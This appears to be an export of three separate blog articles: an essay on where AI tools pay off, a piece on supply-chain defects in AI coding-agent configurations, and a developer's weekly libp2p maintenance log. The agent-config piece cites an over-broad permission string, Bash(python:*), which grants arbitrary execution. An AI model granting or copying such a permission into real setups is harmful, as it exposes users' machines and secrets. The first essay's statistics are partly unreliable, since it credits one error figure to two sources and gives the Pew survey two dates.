And the number that explains the whole thing: developers accepted fewer than 44% of the AI-generated code. More than half of what the model produced was thrown away or heavily rewritten. The work didn't disappear — it moved, from writing (which an expert is fast at) to reviewing someone else's plausible-but-maybe-wrong code (which is slow and draining).

The honest caveat: this is 16 experts on code they know intimately. 4 of the 16 did speed up. Beginners, unfamiliar codebases, and greenfield work may genuinely gain — which is not a loophole, it's the thesis: the benefit tracks who's holding it and whether they can verify the output cheaply.

Fact 2 — The AI most people actually touch is the one they never chose, and it's wrong a lot

For the average person, "AI" isn't a chatbot they opened on purpose. It's the summary that appears above the search results whether they asked for it or not. That is the left column, at planetary scale.

The measurements:

  • An analysis using the Oumi / New York Times methodology found the model behind those overviews (Gemini 3) returns incorrect information on ~28% of queries on its own; it improves when fused with live search.
  • Even when the final overview looks correct, the analysis found 56% of those accurate-looking answers were "ungrounded" — they cited sources that didn't actually support the claim being made.
  • Of the 5,380 sources the summaries leaned on, the second- and fourth-most-cited were Facebook and Reddit. Authoritative-sounding answers, substantially assembled from forum posts.
  • Critics extrapolate that even a 9% inaccuracy rate across ~50% of searches implies on the order of hundreds of millions of misleading summaries per day (an estimate — Google disputes the methodology; its own data shows Gemini 3 wrong on ~28% of queries before search grounding).

Then the part that makes error dangerous rather than annoying — Pew Research:

How much of an AI search summary gets fact-checked by the reader
██ 1%   clicked a source link
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 99%   took it as-is

When users encounter one of these overviews, they click a source link 1% of the time. The summary is the answer for 99% of people. A left-column error isn't a wrong draft an expert will catch — it's a confident wrong answer delivered to the exact person who asked because they didn't already know. That's the person who drains the wrong oil on a two-stroke engine, misses a legal deadline, or follows a config that doesn't exist — and finds out only after it's too late to matter.

Fact 3 — When "chosen" AI leaks into someone else's "forced" column, it has a price tag

Here's the twist most AI-productivity debates miss: the two columns aren't fixed. Your chosen AI becomes your coworker's forced AI the moment you paste its output into a doc and hit send.

Researchers named this. A September 2025 Harvard Business Review study by BetterUp Labs and Stanford's Social Media Lab (survey of 1,150 full-time U.S. desk workers, Aug–Sept 2025) coined the term "workslop": AI-generated work that looks polished but lacks the substance to actually move a task forward, dumping the real thinking onto the recipient.

The findings:

Metric Figure
Workers who received workslop in the prior month ~40%
Average time to untangle each incident 1 hour 56 minutes
Estimated invisible cost per employee ~$186 / month
Scaled to a 10,000-person org ~$9M / year in lost productivity
Recipients who trusted the sender less afterward ~half saw them as less capable/reliable

More than half of recipients reported being annoyed; 22% were offended. (Caveat: cost and time figures are self-reported, and BetterUp sells coaching — treat the $9M as the vendor's framing, not gospel.) But the direction is the point: the productivity AI "saved" the sender reappears as a larger cost on the receiver's desk, plus a trust hit. It didn't vanish. It got transferred — and taxed interest.

That's the left/right columns colliding: an expert used the tool, skipped the verification step that makes it safe, and shipped the unverified output to someone who now has to do the checking and the fixing.

Fact 4 — The "slop feeding on slop" fear has a name and a Nature paper

As the open web fills with generated text, models increasingly train on the output of earlier models. Shumailov et al., "AI models collapse when trained on recursively generated data" (Nature, July 2024) tested exactly that failure mode.

The method: they fine-tuned a language model on a Wikipedia-derived dataset, then fine-tuned the next model on the previous model's own output — repeated across nine generations.

The slop loop (model collapse)
Humans post AI text  →  next model trains on it  →  rare/correct details fade
        ↑                                                        │
        └──────────────  output degrades into confident nonsense ┘

The result: each generation, the tails of the distribution — the rare, specific, correct details — quietly disappeared first, until the output degraded into fluent nonsense. They proved it for LLMs, variational autoencoders, and Gaussian mixture models (so it's a property of the recursive-training setup, not one model's quirk). Mixing ~10% real human data into each generation slowed the rot; it did not stop it.

"Garbage in, garbage out" stops being a boomer joke and becomes the training-data crisis the labs are now spending real money to avoid — and it's the same mechanism as workslop and ungrounded AI Overviews, one level up: a system that consumes its own confident output eventually can't tell signal from noise.

Fact 5 — The wariness is the median, and there's a measured cost per prompt too

If you suspect the skeptics are a loud minority — Pew Research, June 2025, 5,023 U.S. adults:

How AI in daily life makes Americans feel Share
More concerned than excited 50%
Equally concerned and excited 38%
More excited than concerned 10%

57% rate AI's societal risks as high; only 25% rate its benefits as high. That's not a bubble — it's the center of the distribution.

And a measured aside the hype usually skips: every one of those forced, often-unread, 99%-unchecked summaries runs real hardware. Credible estimates land around ~0.3 Wh of electricity per average query (Epoch AI; OpenAI's own figure is similar) and roughly ~519 ml of water per 100-word response (UC Riverside, via The Washington Post). The per-query numbers are small and genuinely contested — but multiply by every search getting an overview nobody asked for and the left column has a utility bill, not just an accuracy problem.

The mechanism: why the line exists at all

Five findings, one underlying cause. It's worth naming, because it predicts new cases, not just explains old ones.

1. The verification tax. An LLM produces output that is plausible but not guaranteed. Someone has to close that gap by checking it. If the checker is an expert on a bounded task (right column), checking is cheap and the tool is a net win. If the checker can't evaluate it — or doesn't bother (99% don't) — the gap doesn't get closed; it gets shipped. METR's 9% review time and <44% acceptance rate is the verification tax, visible on a stopwatch.

2. Removal cost is asymmetric, and so is value. The tool's value is highest exactly where the user least needs it (an expert who could do the job anyway, verifying fast) and lowest where the user most needs it (a non-expert who can't verify at all). We deployed it by default to the second group — the search bar, the forced copilot, the chatbot that replaced the support line — which is precisely backwards from where it pays off.

3. Skill atrophy closes the escape hatch. The whole system assumes an expert is standing by to catch mistakes. But if juniors learn on AI output instead of on the problem, the supply of people who can catch mistakes shrinks — right as the volume of plausible-wrong output explodes. Today the senior catches it; the open question is who catches it in ten years.

That's the engine. Wherever output is plausible-but-unverified and the receiver can't cheaply check it, you get a tax. Wherever an expert verifies a bounded task on a dataset too big to read by hand, you get a genuine win.

Where the right column genuinely wins

To be clear this isn't "AI bad" — the real wins are specific and they all share a shape:

  • Log and data triage. Point it at 100k lines of logs or a messy ERP export; it surfaces the standouts in minutes. The human still verifies; the machine just does the reading nobody wants to.
  • Large-dataset pattern-finding. Triaging huge cancer-cell or bloodwork datasets to narrow options — hours instead of months — with an expert reading the shortlist.
  • Static analysis and security. Genuinely strong at studying a fixed artifact (a codebase) and flagging edge cases a human would miss.

Every win: a domain expert, a bounded and checkable task, a dataset too big to read by hand. The AI isn't trusted — it's used, by someone who can catch it the instant it's wrong.

Which gives the honest one-liner:

AI isn't good or bad. It's a power tool that's safe in the hands of someone who could do the job without it — and dangerous the instant it's handed to someone who can't tell when it's lying.

The test you can actually use

Before you — or your company — drop AI into a workflow, ask one question:

"Can the person receiving this output tell when it's wrong?"

  • Yes → right column. Ship it. (Log-crunching, data triage, a first draft an expert will edit.)
  • No → you've built a confident-wrong-answer machine aimed at the one person who can't catch it. That's the forced-search-summary trap, the workslop trap, the junior-shipping-code-they-can't-review trap.

Nearly every argument about whether AI is "overhyped" or "revolutionary" collapses into that line. People are usually just standing in different columns, describing different products, using the same word.

Your turn

The question I actually want answered in the comments:

What's the one task where AI genuinely made you faster — and be honest: could you catch it when it got that task wrong? If the answer is "no," I'd love to hear how you found out it was wrong, and what it cost.

I write about where AI actually earns its keep versus where it's just expensive confidence — the measured version, not the hype version. If that's your thing, follow me here.

Sources: METR 2025 RCT — methodology & time breakdown (The Register) · METR slowdown detail (TechRadar) · Google AI Overviews accuracy analysis (TechRepublic) · AI Overviews ungrounded / Reddit-cited (Shopifreaks) · "Workslop" HBR / BetterUp / Stanford (Axios) · Model collapse, Nature 2024 (Tech Xplore) · Pew Research — how Americans view AI, Sept 2025 · Per-query energy/water estimates (Epoch AI; UC Riverside)

articles.title: Your Agent's Config Is a Dependency With No Lockfile
articles.description: Your dependency policy is probably decent. Locked versions, hash verification, an SBOM if you're...
articles.body_html:
Your Agent's Config Is a Dependency With No Lockfile

Your dependency policy is probably decent. Locked versions, hash verification, an SBOM if you're serious, a review gate for new packages.

Meanwhile your coding agent imports instructions, skills, hooks, tool declarations, and subagents from public marketplaces and repositories. It runs all of it with your privileges, in your working directory, continuously. And none of it is in the lockfile, because the harness, as researchers now call this layer, has no lockfile.

What's Actually in the Harness

Inventory it sometime: the instruction files, the skills directory, the hooks that fire on events, the MCP server declarations, the subagent definitions. Each of these is code-shaped. Each was probably installed by copying a snippet from a README or a marketplace listing, sometimes written by a stranger, sometimes generated by another model.

We spent a decade teaching teams to treat npm installs as untrusted input. Then we built a new dependency layer, made it executable, made it ambient, and gave it a filename that sounds like configuration.

Someone Finally Measured It

In September 2026, researchers published the first systematic scan of the harness: 3,171 public GitHub repositories with assembled agent setups, 2,660 of them combining multiple component types, plus 511 published skill collections.

The results, and the method deserves respect: every finding was independently re-derived from the repository at its pinned commit, disagreements went to an adjudicator, and a second model session re-checked every counted pair.

16% of setups carry a security defect. The breakdown:

  • 9.8% install an MCP server with no version pinned. What you reviewed is not necessarily what runs.
  • 3.1% pre-approve arbitrary execution behind a scoped-looking grant. A permission like Bash(python:*) reads as contained and means anything Python can do, which is anything.
  • A third class ships inside skill collections: skills that pre-approve the shell for whoever installs them, arriving through marketplaces where a scan could theoretically see them.

The scary reading is the exploit chain. The accurate reading is quieter and worse: these are defects in ordinary setups, assembled by ordinary developers, following ordinary READMEs. Nobody got hacked in the study. Everybody got exposed.

Why This Is Not Like Packages

A dependency executes at build or test time, in a context you scaffolded. The harness runs as you, all the time, in the directory where your work and your secrets live. And its permissions read like configuration to a human scanning a PR diff, while functioning like a grant of execution to a machine reading them literally.

The scoped-looking grant is the perfect emblem: a permission string designed to feel surgical, meaning "run anything."

The Hygiene, Until the Ecosystem Grows Up

Pin everything. MCP server versions, skill sources, hook scripts. What changed since install is the first question an incident will ask.

Review config like dependency changes. The .claude directory and its cousins go through PRs, not direct commits. A config diff is a supply-chain diff.

Scan it. The study's instrument, corpus, and verdicts are released. Run it against your own setups before someone else's paper does.

Grant minimally, out loud. Enumerate what is pre-approved in your agent config, in a file a human reads monthly. The pre-approvals you forgot are the ones that get you.

💡 Pro-tip: the one-line audit: list every permission in your agent config that lets something execute without asking. If that list is longer than you remembered, you have found the article's point in your own repository.

What the Scan Misses

Scanning catches rule-decidable defects only. Intent cannot be scanned, and no lockfile standard exists for this layer yet, so this is manual discipline for now: pins, reviews, scans, minimal grants.

The harness is still worth it. So was npm. We just know how the first chapter of this story goes.

What's in your agent config directory that you didn't put there, and when did you last look?

References

  1. Scanning the Harness: An Empirical Study of Supply-Chain Defects in AI Coding-Agent Configurations (September 2026), instrument and data released: arxiv.org/abs/2609.07360

articles.title: Dev log # 30 Plumbing the depths of libp2p: A multi-language maintenance week
articles.description: Hi, glad you found your way here. I'm Yash, a developer who contributes to open source, mostly p2p...
articles.body_html:
Hi, glad you found your way here. I'm Yash, a developer who contributes to open source, mostly p2p networking and AI tooling. Each week I write up what I shipped, what broke, and what fixing it taught me.

GitHub · X · LinkedIn · Portfolio

TL;DR

This week was all about the "plumbing" of the decentralized web. I spent my time jumping between three different implementations of the libp2p protocol—Go, Python, and .NET—focusing on resource management, async lifecycles, and Gossipsub robustness. I opened one significant PR in go-libp2p to fix a connection leak, filed three detailed issues in py-libp2p regarding shutdown hangs and DNS resolution, and provided feedback on three PRs in the dotnet-libp2p ecosystem.

Digging into the Go Upgrader

The highlight of my week was working on go-libp2p. If you’ve ever done low-level networking, you know that the "upgrading" process—where a raw connection becomes a secure, multiplexed libp2p connection—is where the most dangerous race conditions live.

I opened a PR titled fix(upgrader): release scope of conns closed before Accept. This addresses a specific edge case in the resource manager. In libp2p, we use "scopes" to track and limit resource usage (like memory and file descriptors). The bug I found was that if a connection was closed by the remote peer or timed out before the local Accept call finished, the resource scope wasn't always being released properly.

I added 181 lines of code, mostly focused on hardening the state machine in the upgrader to ensure that no matter how a connection dies during the handshake, we aren't leaking resources. It’s one of those fixes that doesn't add a flashy feature but keeps a long-running node from slowly eating all the RAM on a server. It's still open and under review, as these kinds of changes require a lot of eyes to ensure we aren't introducing new deadlocks.

Troubleshooting the Python Lifecycle

While the Go work was about fixing a leak, my time with py-libp2p was about diagnosing why things won't stop. I opened three issues this week that all center around the complexity of asynchronous lifecycles in Python, specifically when using structured concurrency (like Trio's nurseries).

The first issue, echo-demo and other one-shot example clients never exit, is a classic "zombie process" problem. I noticed that our example scripts would finish their work but then just hang indefinitely. After some digging, I realized the main nursery was waiting on a background peerstore cleanup task that never got the signal to shut down. It's a small thing that makes the developer experience feel "broken" for newcomers, so I'm hoping to get a fix in for that soon.

I also filed Leaving host.run() leaves connections and listeners open. This is a more serious architectural issue where the Swarm isn't properly cleaning up its internal state when the host is cancelled. If you're running a dynamic system where you're starting and stopping nodes frequently, this would eventually lead to a "too many open files" error.

Finally, I hit a weird networking edge case and documented it in /dns6/localhost can't be dialed on a host with no global IPv6. Basically, the library was being a bit too aggressive in assuming that any DNS6 address must be a public, dialable address, even when it's just a local loopback on a machine that doesn't have a global IPv6 route. Networking is hard, and local dev environments are often the weirdest places for these bugs to hide.

Reviewing the .NET Stack

I also spent some time in the dotnet-libp2p repository, which is being led by the Nethermind team. They are doing some great work bringing the protocol to the C# ecosystem, and I helped out with three code reviews this week.

Two of the reviews were focused on Gossipsub, which is the heavy-duty pubsub protocol used by blockchains like Ethereum. I commented on Populate Gossipsub IP-colocation scoring input and Randomize Gossipsub mesh fanout and gossip peer selection.

These are critical for security. IP-colocation scoring helps the network identify if a single entity is trying to run hundreds of nodes from the same IP range to try and "eclipse" or manipulate the network. Randomizing peer selection is equally important to ensure the gossip network remains a "small world" graph that is resilient to targeted attacks. It’s great to see the .NET implementation reaching this level of maturity.

I also did a quick sanity check on a repository maintenance PR, Move Libp2p.slnx to the repository root, which is just good housekeeping for anyone working in a .NET environment.

Tech Stack & Vibe

This week was a true polyglot experience. Even though the languages data doesn't show a specific commit weight (since I was mostly focused on issues and reviews outside of the one Go PR), I was effectively working across:

  • Go: For the core resource management logic.
  • Python: For diagnosing async lifecycle and DNS issues.
  • C# (.NET): For reviewing security-sensitive Gossipsub logic.

It’s a "maintenance and mentorship" week. I didn't land dozens of commits, but I spent my time where it arguably matters more: helping other implementations stay secure and fixing the bugs that make tools frustrating to use.

What's Next

Next week, I want to follow up on the go-libp2p PR. Resource manager changes usually involve a bit of back-and-forth with the maintainers to make sure the performance trade-offs are worth it. I also want to see if I can actually submit the PRs for those py-libp2p issues I opened. It's one thing to point out that the nursery is hanging; it's another to actually rearrange the async task tree to fix it.

Onward to more green tests!
